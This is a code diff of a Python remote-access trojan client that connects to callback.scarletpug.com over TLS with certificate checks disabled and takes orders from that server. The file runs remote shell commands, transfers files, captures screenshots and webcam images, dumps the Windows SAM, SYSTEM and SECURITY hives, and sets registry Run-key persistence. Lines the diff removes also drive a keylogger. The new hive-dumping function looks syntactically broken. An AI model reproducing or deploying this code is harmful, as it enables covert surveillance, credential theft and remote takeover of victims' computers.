@@ -1,4 +1,3 @@
-# Standard library imports
 import ctypes
 import cv2
 import json
@@ -11,148 +10,106 @@ import sys
 import threading
 import time
 from sys import platform
-
-# Related third party imports
 import requests
 from mss import mss
-
-# Local application/library specific imports
 import keylogger
 
+# === Reliable Communication with Length Prefix Framing ===
+def recvall(sock, length):
+    data = b''
+    while len(data) < length:
+        try:
+            packet = sock.recv(length - len(data))
+            if not packet:
+                raise ConnectionError("[ERROR] Connection closed while receiving data")
+            data += packet
+        except socket.timeout:
+            print("[DEBUG] Socket timeout while waiting for data")
+            continue
+    return data
 
 def reliable_send(s, data):
-    print('[DEBUG] Entering reliable_send()')
     try:
         jsondata = json.dumps(data)
-        print(f'[DEBUG] JSON-encoded data: {jsondata}')
-        s.send(jsondata.encode())
-        print('[DEBUG] Data successfully sent')
-    except TypeError as e:
-        print(f'[ERROR] Failed to serialize data to JSON: {e}')
-    except socket.error as e:
-        print(f'[ERROR] Socket error during send: {e}')
+        encoded = jsondata.encode()
+        length = len(encoded)
+        print(f"[DEBUG] Sending message of length: {length}")
+        s.sendall(f"{length:<16}".encode())
+        s.sendall(encoded)
+        print(f"[DEBUG] Sent data: {jsondata}")
     except Exception as e:
-        print(f'[ERROR] Unexpected error in reliable_send: {e}')
-
-
+        print(f"[ERROR] Failed to send data: {e}")
 
 def reliable_recv(s):
-    print('[DEBUG] Entering reliable_recv()')
-    data = ''
-    while True:
-        try:
-            chunk = s.recv(1024).decode().rstrip()
-            print(f'[DEBUG] Received chunk: {chunk}')
-            data += chunk
-            parsed = json.loads(data)
-            print('[DEBUG] Successfully parsed JSON:', parsed)
-            return parsed
-        except ValueError as e:
-            print('[DEBUG] Incomplete JSON data, waiting for more...')
-            continue
-        except socket.timeout as e:
-            print(f'[DEBUG] Socket timeout: {e}')
-            break
-        except socket.error as e:
-            print(f"[DEBUG] Socket error: {e}")
-            return None
-        except Exception as e:
-            print(f"[DEBUG] Unexpected error: {e}")
-            return None
+    try:
+        print("[DEBUG] Waiting for length header...")
+        length_data = recvall(s, 16)
+        msg_length = int(length_data.decode().strip())
+        print(f"[DEBUG] Expecting message of length: {msg_length}")
+        json_data = recvall(s, msg_length).decode()
+        print(f"[DEBUG] Received full JSON: {json_data}")
+        return json.loads(json_data)
+    except json.JSONDecodeError as e:
+        print(f"[ERROR] JSON decode failed: {e}")
+        return None
+    except Exception as e:
+        print(f"[ERROR] Failed to receive data: {e}")
+        return None
 
-
-
+# === File Transfer ===
 def download_file(s, file_name):
-    f = open(file_name, 'wb')
-    s.settimeout(2)
-    chunk = s.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = s.recv(1024)
-        except socket.timeout as e:
-            break
-    s.settimeout(None)
-    f.close()
-
+    print(f"[DEBUG] Starting download to {file_name}")
+    with open(file_name, 'wb') as f:
+        s.settimeout(2)
+        while True:
+            try:
+                chunk = s.recv(1024)
+                if not chunk:
+                    break
+                f.write(chunk)
+            except socket.timeout:
+                break
+        s.settimeout(None)
+    print("[DEBUG] File download complete")
 
 def upload_file(s, file_name):
-    f = open(file_name, 'rb')
-    s.send(f.read())
-    f.close()
+    print(f"[DEBUG] Uploading file: {file_name}")
+    with open(file_name, 'rb') as f:
+        s.sendall(f.read())
+    print("[DEBUG] File upload complete")
 
-
+# === Features ===
 def download_url(url):
+    print(f"[DEBUG] Downloading from URL: {url}")
     get_response = requests.get(url)
     file_name = url.split('/')[-1]
     with open(file_name, 'wb') as out_file:
         out_file.write(get_response.content)
-
+    print(f"[DEBUG] Saved as {file_name}")
 
 def screenshot():
-    if platform == "win32" or platform == "darwin":
-        with mss() as screen:
-            filename = screen.shot()
-            os.rename(filename, '.screen.png')
-    elif platform == "linux" or platform == "linux2":
-        with mss(display=":0.0") as screen:
-            filename = screen.shot()
-            os.rename(filename, '.screen.png')
-
-
-def get_sam_dump():
-    if not is_admin():
-        return "You must run this function as an Administrator."
-
-    SAM = r'C:\Windows\System32\config\SAM'
-    SYSTEM = r'C:\Windows\System32\config\SYSTEM'
-    SECURITY = r'C:\Windows\System32\config\SECURITY'
-
-    try:
-        sam_file = open(SAM, 'rb')
-        system_file = open(SYSTEM, 'rb')
-        security_file = open(SECURITY, 'rb')
-
-        sam_data = sam_file.read()
-        system_data = system_file.read()
-        security_data = security_file.read()
-
-        sam_file.close()
-        system_file.close()
-        security_file.close()
-
-        return sam_data, system_data, security_data
-    except PermissionError:
-        return "Insufficient permissions to access SAM, SYSTEM, or SECURITY files."
-    except FileNotFoundError:
-        return "SAM, SYSTEM, or SECURITY file not found. Please check the file paths."
-    except Exception as e:
-        return f"An unexpected error occurred: {str(e)}"
-
+    print("[DEBUG] Taking screenshot")
+    with mss(display=":0.0" if platform.startswith("linux") else None) as screen:
+        filename = screen.shot()
+        os.rename(filename, '.screen.png')
+        print("[DEBUG] Screenshot saved")
 
 def capture_webcam():
+    print("[DEBUG] Attempting to capture webcam")
     webcam = cv2.VideoCapture(0)
     webcam.set(cv2.CAP_PROP_EXPOSURE, 40)
-
     if not webcam.isOpened():
-        print("No webcam available")
+        print("[ERROR] Webcam not available")
         return
-
     ret, frame = webcam.read()
-
-    if not ret:
-        print("Failed to read frame from webcam")
-        return
-
     webcam.release()
-
-    is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
-    if is_success:
+    if ret:
+        _, buffer = cv2.imencode(".webcam.png", frame)
         with open('.webcam.png', 'wb') as f:
-            f.write(im_buf_arr.tobytes())
+            f.write(buffer.tobytes())
+        print("[DEBUG] Webcam capture complete")
     else:
-        print("Failed to save webcam image")
-
+        print("[ERROR] Webcam read failed")
 
 def persist(s, reg_name, copy_name):
     file_location = os.environ['appdata'] + '\\' + copy_name
@@ -160,133 +117,110 @@ def persist(s, reg_name, copy_name):
         if not os.path.exists(file_location):
             shutil.copyfile(sys.executable, file_location)
             subprocess.call(
-                r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + r' /t REG_SZ /d "' + file_location + r'"',
+                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {reg_name} /t REG_SZ /d "{file_location}"',
                 shell=True)
             reliable_send(s, '[+] Created Persistence With Reg Key: ' + reg_name)
         else:
             reliable_send(s, '[+] Persistence Already Exists')
-    except:
+    except Exception as e:
+        print(f"[ERROR] Persistence failed: {e}")
         reliable_send(s, '[-] Error Creating Persistence With The Target Machine')
 
-
 def is_admin():
-    global admin
-    if platform == 'win32':
-        try:
-            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', r'C:\windows'), 'temp']))
-        except:
-            admin = '[!!] User Privileges!'
-        else:
-            admin = '[+] Administrator Privileges!'
+    try:
+        temp = os.listdir(os.path.join(os.environ.get('SystemRoot', r'C:\windows'), 'temp'))
+        return True
+    except:
+        return False
 
+def get_sam_dump():
+    if not is_admin():
+        return "You must run this function as an Administrator."
+    try:
+        with open(r'C:\Windows\System32\config\SAM', 'rb') as sam_file,
+             open(r'C:\Windows\System32\config\SYSTEM', 'rb') as system_file,
+             open(r'C:\Windows\System32\config\SECURITY', 'rb') as security_file:
+            return sam_file.read(), system_file.read(), security_file.read()
+    except Exception as e:
+        return f"[ERROR] Could not access registry hives: {e}"
 
+# === Command Loop ===
 def shell(s):
     while True:
         command = reliable_recv(s)
-        if command == 'quit':
+        if not command:
+            print("[DEBUG] Empty command, breaking")
             break
-        elif command == 'background' or command == 'bg':
-            pass
-        elif command == 'clear':
-            pass
-        elif command[:3] == 'cd ':
-            os.chdir(command[3:])
-        elif command[:6] == 'upload':
-            download_file(s, command[7:])
-        elif command[:8] == 'download':
-            upload_file(s, command[9:])
-        elif command[:3] == 'get':
-            try:
+        print(f"[DEBUG] Received command: {command}")
+        try:
+            if command == 'quit':
+                break
+            elif command.startswith('cd '):
+                os.chdir(command[3:])
+            elif command.startswith('upload '):
+                download_file(s, command[7:])
+            elif command.startswith('download '):
+                upload_file(s, command[9:])
+            elif command.startswith('get '):
                 download_url(command[4:])
-                reliable_send(s, '[+] Downloaded File From Specified URL!')
-            except:
-                reliable_send(s, '[!!] Download Failed!')
-        elif command[:10] == 'screenshot':
-            screenshot()
-            upload_file(s, '.screen.png')
-            os.remove('.screen.png')
-        elif command[:6] == 'webcam':
-            capture_webcam()
-            upload_file(s, '.webcam.png')
-            os.remove('.webcam.png')
-        elif command[:12] == 'keylog_start':
-            keylog = keylogger.Keylogger()
-            t = threading.Thread(target=keylog.start)
-            t.start()
-            reliable_send(s, '[+] Keylogger Started!')
-        elif command[:11] == 'keylog_dump':
-            logs = keylog.read_logs()
-            reliable_send(s, logs)
-        elif command[:11] == 'keylog_stop':
-            keylog.self_destruct()
-            t.join()
-            reliable_send(s, '[+] Keylogger Stopped!')
-        elif command[:11] == 'persistence':
-            reg_name, copy_name = command[12:].split(' ')
-            persist(s, reg_name, copy_name)
-        elif command[:7] == 'sendall':
-            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                             stdin=subprocess.PIPE)
-        elif command[:5] == 'check':
-            try:
-                is_admin()
-                reliable_send(s, admin + ' platform: ' + platform)
-            except:
-                reliable_send(s, 'Cannot Perform Privilege Check! Platform: ' + platform)
-        elif command[:5] == 'start':
-            try:
+                reliable_send(s, '[+] File downloaded')
+            elif command == 'screenshot':
+                screenshot()
+                upload_file(s, '.screen.png')
+                os.remove('.screen.png')
+            elif command == 'webcam':
+                capture_webcam()
+                upload_file(s, '.webcam.png')
+                os.remove('.webcam.png')
+            elif command.startswith('persistence '):
+                reg, name = command[12:].split(' ')
+                persist(s, reg, name)
+            elif command == 'check':
+                reliable_send(s, '[+] Admin Privileges' if is_admin() else '[!!] Not Admin')
+            elif command.startswith('start '):
                 subprocess.Popen(command[6:], shell=True)
-                reliable_send(s, '[+] Started!')
-            except:
-                reliable_send(s, '[-] Failed to start!')
-        elif command[:12] == 'get_sam_dump':
-            sam_dump, system_dump, security_dump = get_sam_dump()
-            reliable_send(s, (sam_dump, system_dump, security_dump))
-        else:
-            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                       stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()
-            result = result.decode()
-            reliable_send(s, result)
+                reliable_send(s, '[+] Started')
+            elif command == 'get_sam_dump':
+                data = get_sam_dump()
+                reliable_send(s, data)
+            else:
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = proc.stdout.read() + proc.stderr.read()
+                reliable_send(s, output.decode())
+        except Exception as e:
+            print(f"[ERROR] Command failed: {e}")
+            reliable_send(s, f"[ERROR] {e}")
 
+# === Connection ===
 def handshake(s):
-    """
-    Sends an initial handshake message to the server.
-    Useful for session registration and connection validation.
-    """
     try:
         reliable_send(s, {"status": "connected", "platform": platform})
+        print("[DEBUG] Handshake sent")
     except Exception as e:
-        print(f"[!] Handshake failed: {e}")
-
+        print(f"[ERROR] Handshake failed: {e}")
 
 def connection():
     host = 'callback.scarletpug.com'
     port = 443
-
     context = ssl.create_default_context()
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
-
     while True:
         try:
+            print(f"[DEBUG] Attempting connection to {host}:{port}")
             raw_socket = socket.create_connection((host, port))
             s = context.wrap_socket(raw_socket, server_hostname=host)
-
             print("[+] Connected to server over TLS")
-
-            handshake(s)  # <-- send handshake before entering shell
+            handshake(s)
             shell(s)
-
             s.close()
             break
         except Exception as e:
-            print(f"[!] Connection error: {e}")
+            print(f"[ERROR] Connection failed: {e}")
             try:
                 s.close()
             except:
                 pass
             time.sleep(5)
-
 
 connection()
